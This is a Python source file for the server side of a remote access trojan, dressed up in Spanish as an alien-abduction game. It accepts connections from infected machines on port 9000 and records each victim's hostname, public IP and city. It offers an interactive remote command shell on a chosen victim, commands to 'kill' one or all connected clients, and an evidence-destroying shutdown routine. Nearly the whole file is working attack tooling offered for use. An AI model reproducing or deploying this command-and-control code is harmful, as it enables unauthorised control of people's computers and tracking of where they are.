
# CONFIGURACIONES PARA EL SERVIDOR ALIENIGENA

import os
import sys
import time
import socket
import ctypes
import pygame	

from tabulate import tabulate
from threading import Thread
from utilidades.cadenas import chain_alien
from utilidades.banners import *



# ----------------------------------------------------------------------------------------


# MODO LIVE PARA ABDUCCION 
EnVivo=False


def cargar_banda_sonora(musica):
	pygame.mixer.music.load(os.getcwd() + musica)
	pygame.mixer.music.play(loops=-1)
	return


def cartelAyuda():
	print("""\033[0;39m

 \033[1;31m[-] Puedes tipear 'ayuda' para ver los comandos disponibles

	""")
	return

def encabezados(banner):
	os.system('clear')
	if banner=="principal":
		banner_principal()
	elif banner=="secundario":
		banner_secundario()
	elif banner=="abduccion":
		banner_abduction_menu()
	elif banner=="laboratorio":
		banner_laboratorio()
	elif banner=="manipular":
		banner_manipular()
	cartelAyuda()
	return


def desplegar_ayuda(COMANDOS):
	print("\n \033[1;37mComandos disponibles")
	print(" \033[1;31m====================\n")
	for nombre,lista in COMANDOS.items():
		print("\033[1;37m {0} \033[1;32m-->\033[0;39m {1}".format(nombre,lista[1]))
	print('\033[0;39m\n')
	return


def ataques():

	import random

	frases = [

	"Aniquilaste a victima con rayo desintegrador",
	"Perforando el ano del objetivo. La cabeza de la victima ha sido explotada",
	"Aturdiendo al individuo con rayos de electricidad",
	"Has disparado una poderosa bomba de iones sobre el terricola",
	"Has extraido el cerebro del individuo, quitandole la vida de manera rapida",
	"Lanzando gusano alienigena para devorar objetivo"
	
	]

	return random.choice(frases)


# ------------------------------------------------------------------------------------------



class Server(Thread):


	# --------- CONFIGURACION DEL SERVIDOR ---------

	def __init__(self,port):
		super(Server, self).__init__()

		self.terricolas = []
		self.ip = "0.0.0.0"
		self.port = int(port)

		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		self.server.bind((self.ip,self.port))
		self.server.listen(5)


	# --------- ENVIAR MENSAJES ---------

	def enviar(self,server,mensaje):
		server.send(bytes(mensaje,'utf-8'))
		return


	# --------- RECIBIR MENSAJES ---------

	def recibir(self,server):
		raw_msg = server.recv(4096)
		msg = (raw_msg).decode('utf-8')
		return msg


	# --------- OBTENER INFORMACION --------- 

	def obtener_informacion(self,client,address):
		hostname = self.recibir(client)
		self.enviar(client,"ready")
		ip_info = (self.recibir(client)).split(',')
		ciudad = ip_info[0]
		ip_public = ip_info[1]
		pais = ip_info[2]
		estado = ip_info[3]
		geolocation = {'city_name':ciudad, 'IPv4':ip_public, 'country_name':pais, 'state':estado}
		return [client,address,hostname,geolocation]



	# --------- ESCRIBIR INFORMACION --------- 

	def EscribirInformacion(self,info):
		inf = "['"+info[2]+"',"+str(info[3])+","+str(info[1][1])+"]\n"
		file = open('abducciones/capturados.txt','a+')
		file.write(inf)
		file.close()
		return


	# --------- ABDUCIR VICTIMAS ---------

	def run(self):

		while (True):
			conexion, address = self.server.accept()
			conexion.setblocking(1)
			client_info = self.obtener_informacion(conexion,address)
			self.terricolas.append(client_info)
			self.EscribirInformacion(client_info)

		return


	def VerAbducciones(self):
		os.system('xterm -title "Abduccion en vivo" -e python3 abducciones/pantalla.py &')
		return


	# --------- LISTAR VICTIMAS ---------

	def ver_terricolas(self):

		lista_terricolas_table = []

		for terricola in self.terricolas:
			lista_terricolas_table.append([terricola[2],terricola[3]["country_name"],terricola[3]["city_name"]])

		if(len(self.terricolas)>0):
			print ("\n")
			print (" \033[1;34mLista de personas secuestradas\033[0;39m\n")
			index = [i for i in range(1,len(self.terricolas)+1)]
			print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=["ID", "Terricola", "Pais", "Ciudad" ], showindex=index),"\n\n")

		else:
		 	print("\n [\033[1;31mx\033[0;39m] No hay personas capturadas\n")

		return



	# --------- REMOVER REGISTRO DE VICTIMA -------------

	def remover_terricola(self,client):
		return self.terricolas.pop(client)	



	# --------- MATAR A UN SECUESTRADO ESPECIFICO -------------
	
	def matar_terricola(self,client):

		self.enviar(self.terricolas[client][0],"matar")
		self.remover_terricola(client)
		return




	# --------- MATAR A TODAS LAS VICTIMAS CAPTURADAS ---------

	def matar_terricolas(self):

		if(len(self.terricolas)>0):
			print(" \n [\033[1;34m*\033[0;39m] Preparandote para acabar con los individuos...\n")
			time.sleep(2)

			for terricola in self.terricolas:
				print(" [\033[1;34m*\033[0;39m] Matando a terricola " + terricola[2])
				print(" [\033[1;34m*\033[0;39m] " + ataques())
				
				self.enviar(terricola[0],'matar')
				time.sleep(0.5)

			self.terricolas.clear()
			print("\n [!] Ha eliminado a todos los secuestrados!\n\n")
		
		else:
			print(" \n [\033[1;31mx\033[0;39m] No hay terricolas\n")

		return



	# --------- DETENER SERVIDOR ---------

	def destruir_evidencias(self):
		for terricola in self.terricolas:
			self.enviar(terricola[0],"matar")
			time.sleep(0.5)
		
		self.terricolas.clear()
		return


	def detener(self):
		self.destruir_evidencias()
		#self.server.shutdown(socket.SHUT_RDWR)
		self.server.close()
		return



class ModosAtaque():

	def run_cmd(servidor,client):
		
		COMANDOS = {

		"detener" : ["stop","Detiene temporalmente a la victima"]

		}

		servidor.enviar(servidor.terricolas[client][0],"cmd")

		sesion = input(" (\033[0;31m" + servidor.terricolas[client][2] + "\033[0;39m)> ")

		while(True):
			if(sesion!=""):
				if("cd " in sesion):
					servidor.enviar(servidor.terricolas[client][0],sesion)
					location = servidor.recibir(servidor.terricolas[client][0])
					print(location)

				elif (sesion=="detener"):
					servidor.enviar(servidor.terricolas[client][0],sesion)
					t = servidor.recibir(servidor.terricolas[client][0])
					print(t)
					break

				elif (sesion=="ayuda"):
					desplegar_ayuda(COMANDOS)

				else:
					servidor.enviar(servidor.terricolas[client][0],sesion)

					data = "\n"

					while(True):
						datos = servidor.recibir(servidor.terricolas[client][0])
						data += datos

						if(datos.endswith("\n Comando utilizado: " + sesion)): 
							break

					print(data + "\n")

			sesion = input(" (\033[0;31m" + servidor.terricolas[client][2] + "\033[0;39m)> ")





# --------------------- MENUS --------------------------------------------

def manipular(servidor,cliente):

	COMANDOS = {

	"cmd" : ["shell","Ejecutar shell"],
	"ayuda": ["Help","Despliega esto"],
	"limpiar": ["Clear","Limpiar pantalla"],
	"volver": ["Back","Regresa al menu principal"]

	}

	encabezados('manipular')
	victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')

	while (victima!="volver"):

		if (victima=="cmd"):
			ModosAtaque.run_cmd(servidor,cliente)
			encabezados('manipular')

		elif (victima=="ayuda"):
			desplegar_ayuda(COMANDOS)

		elif (victima==""):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "',victima, '" no encontrado.\n')

		victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')

	return


def laboratorio(servidor):

	COMANDOS = {

	"manipular <id>" : ["Manipulation","Controlar a un individuo especifico"],
	"matar <id>" : ["Kill","Sirve para asesinar al terricola"],
	"listar": ["List","Lista a las personas comprometidas de manera interactiva"],
	"ayuda": ["Help","Despliega esto"],
	"limpiar": ["Clear","Limpiar pantalla"],
	"volver": ["Back","Regresa al menu principal"]

	}

	lista_terricolas_table = []

	for terricola in servidor.terricolas:
		lista_terricolas_table.append([terricola[2],terricola[3]["country_name"],terricola[3]["city_name"],terricola[1][0],terricola[3]["IPv4"],terricola[1][1]])

	encabezados("laboratorio")

	print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")

	prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')

	while(prompt_laboratorio!="volver"):

		if ('manipular' in prompt_laboratorio):
			try:
				cliente = int(prompt_laboratorio.replace('manipular', ''))-1

				if (cliente < len(servidor.terricolas)) and (cliente>=0):
					manipular(servidor,cliente)
					encabezados("laboratorio")
					print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
				else:
					print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");

			except ValueError:
				print (" \n [\033[1;31mx\033[0;39m] Error al manipular a victima. Utilice 'manipular <id>'\n");

		elif ('matar' in prompt_laboratorio):
			try:
				cliente = int(prompt_laboratorio.replace('matar', ''))-1
				
				if (cliente < len(servidor.terricolas)) and (cliente>=0):
					servidor.matar_terricola(cliente)
					lista_terricolas_table.pop(cliente)
					print("\n [\033[1;34m*\033[0;39m] " + ataques())
				else:
					print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");

			except ValueError:
				print (" \n [\033[1;31mx\033[0;39m] Error al matar a victima. Utilice 'matar <id>'\n");

		elif (prompt_laboratorio=="listar"):
			if(len(servidor.terricolas)>0):
				print ("\n")

				print (" \033[1;34mLista de personas secuestradas\033[0;39m\n")

				index = [i for i in range(1,len(servidor.terricolas)+1)]
				print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=["ID", "Terricola", "Pais", "Ciudad" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"], showindex=index),"\n\n")

			else:
				print("\n [\033[1;31mx\033[0;39m] No hay personas secuestradas\n")

		elif (prompt_laboratorio=="ayuda"):
			desplegar_ayuda(COMANDOS)

		elif (prompt_laboratorio==""):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')


		prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower())

	return


def AbduccionEnVivo(servidor):
	global EnVivo

	if (EnVivo==False):
		EnVivo=True
		servidor.VerAbducciones()
	else:
		print(" Modo abduccion en vivo: activo")
		activar = (input(" El modo abduccion en vivo se encuentra activa. Desea apagarla? (s/n): ")).lower()
		while (activar!="s") and (activar!="n"):
			print(" Opcion inexistente... Intente nuevamente...")
			activar = (input(" El modo abduccion en vivo se encuentra activa. Desea apagarla? (s/n): ")).lower()
		if (activar=="s"):
			os.system('pkill -9 -f xterm')
			EnVivo=False
			print(" Modo abduccion en vivo: desactivado")
			time.sleep(2.5)
	return


def abducciones_menu(servidor):

	COMANDOS = {

	"pantalla" : ["Screen","Permite ver el proceso de abduccion en modo real"],
	"abducidos" : ["Abducted","Lista todas las personas secuestradas"],
	"ayuda": ["Help","Despliega esto"],
	"volver": ["Back","Regresa al menu principal"]

	}
	
	pygame.init()
	cargar_banda_sonora("/musica/abduction.mp3")

	encabezados("abduccion")

	selector = (input(" \033[0;39mInvasores (\033[0;31mAbducciones\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	while (selector!='volver'):

		if (selector=='pantalla'):
			AbduccionEnVivo(servidor)
			encabezados("abduccion")

		elif (selector=='abducidos'):
			servidor.ver_terricolas()

		elif (selector=='ayuda'):
			desplegar_ayuda(COMANDOS)

		elif(selector == ''):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "', selector, '" no encontrado.\n')

		selector = (input(" \033[0;39mInvasores (\033[0;31mAbducciones\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	return


def menu():

	COMANDOS = {

	"abducir" : ["Abduct","Acceder al menu de abducciones"],
	"laboratorio" : ["Laboratory","Acceder al laboratorio"],
	"destruirlos" : ["Massive Destruction","Destruye a todos los individuos comprometidos"],
	"ayuda" : ["Help","Despliega esto"],
	"limpiar" : ["Clear","Limpia pantalla"],
	"salir" : ["Exit","Salir del programa"]

	}

	servidor = Server(9000)
	servidor.setDaemon(True)
	servidor.start()

	pygame.init()
	cargar_banda_sonora("/musica/laboratory.mp3")

	encabezados("secundario")

	opcion = (input(" \033[0;39mInvasores (\033[0;31mPrincipal\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	while(opcion!="volver"):

		if(opcion=="abducir"):
			abducciones_menu(servidor)
			cargar_banda_sonora("/musica/laboratory.mp3")
			encabezados("secundario")
		elif(opcion=="laboratorio"):
			laboratorio(servidor)
			encabezados("secundario")
		elif(opcion=="destruirlos"):
			servidor.matar_terricolas()
		elif(opcion=="ayuda"):
			desplegar_ayuda(COMANDOS)
		elif(opcion=="limpiar"):
			encabezados("secundario")
		elif(opcion==''):
			pass
		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "', opcion, '" no encontrado.\n')


		opcion = (input(" \033[0;39mInvasores (\033[0;31mPrincipal\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	os.system('pkill -9 -f xterm')
	os.system('clear')
	servidor.detener()

	return


if __name__ == '__main__':
	menu()
